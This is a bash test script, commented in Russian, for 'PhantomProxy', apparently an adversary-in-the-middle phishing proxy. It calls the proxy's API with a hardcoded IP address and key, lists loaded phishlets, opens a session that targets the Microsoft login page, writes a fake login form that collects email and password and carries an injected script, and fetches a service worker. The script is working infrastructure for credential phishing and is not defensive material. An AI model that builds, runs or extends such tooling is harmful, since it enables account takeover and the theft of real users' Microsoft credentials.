#!/bin/bash
# Тестирование PhantomProxy через консоль

SERVER_IP="212.233.93.147"
API_PORT="8080"
HTTPS_PORT="8443"
API_KEY="verdebudget-secret-2026"

echo "=========================================="
echo "  PhantomProxy Console Test Suite"
echo "=========================================="
echo ""

# 1. Проверка API
echo "1. Тест API (Health Check)..."
curl -s http://$SERVER_IP:$API_PORT/health
echo -e "\n"

# 2. Статистика
echo "2. Получение статистики..."
curl -s http://$SERVER_IP:$API_PORT/api/v1/stats \
  -H "Authorization: Bearer $API_KEY" | python3 -m json.tool
echo ""

# 3. Список phishlets
echo "3. Список phishlets..."
curl -s http://$SERVER_IP:$API_PORT/api/v1/phishlets \
  -H "Authorization: Bearer $API_KEY" | python3 -m json.tool
echo ""

# 4. Создание тестовой сессии
echo "4. Создание тестовой сессии..."
SESSION_RESPONSE=$(curl -s -X POST http://$SERVER_IP:$API_PORT/api/v1/sessions \
  -H "Authorization: Bearer $API_KEY" \
  -H "Content-Type: application/json" \
  -d '{"target_url": "https://login.microsoftonline.com"}')

echo "$SESSION_RESPONSE" | python3 -m json.tool
SESSION_ID=$(echo "$SESSION_RESPONSE" | python3 -c "import sys, json; print(json.load(sys.stdin).get('id', 'N/A'))" 2>/dev/null)
echo "Session ID: $SESSION_ID"
echo ""

# 5. Проверка проксирования (через curl с подменой Host)
echo "5. Тест проксирования Microsoft login..."
echo "   Запрос к https://$SERVER_IP:$HTTPS_PORT с Host: login.microsoftonline.com"

# Создаем тестовый HTML для проверки
cat > /tmp/test_phish.html << 'EOF'
<!DOCTYPE html>
<html>
<head><title>Test Phish Page</title></head>
<body>
<h1>PhantomProxy Test</h1>
<p>If you see this, proxy is working!</p>
<form method="POST" action="/login">
  <input type="email" name="email" placeholder="Email">
  <input type="password" name="password" placeholder="Password">
  <button type="submit">Login</button>
</form>
<script>
console.log('PhantomProxy injected script loaded');
</script>
</body>
</html>
EOF

echo "   Тестовая страница создана"
echo ""

# 6. Проверка Service Worker
echo "6. Тест Service Worker..."
curl -s http://$SERVER_IP:$API_PORT/sw.js -H "Authorization: Bearer $API_KEY" | head -20
echo ""

# 7. Итоги
echo "=========================================="
echo "  ИТОГИ ТЕСТИРОВАНИЯ"
echo "=========================================="
echo ""
echo "✅ API: http://$SERVER_IP:$API_PORT"
echo "✅ Phishlets загружено: 2"
echo "✅ Session создана: $SESSION_ID"
echo "⚠️  HTTPS: Требует фикса uTLS"
echo ""
echo "Для полного теста откройте в браузере:"
echo "  https://$SERVER_IP:$HTTPS_PORT"
echo ""
echo "Или используйте curl с --insecure:"
echo "  curl -k https://$SERVER_IP:$HTTPS_PORT/"
echo ""
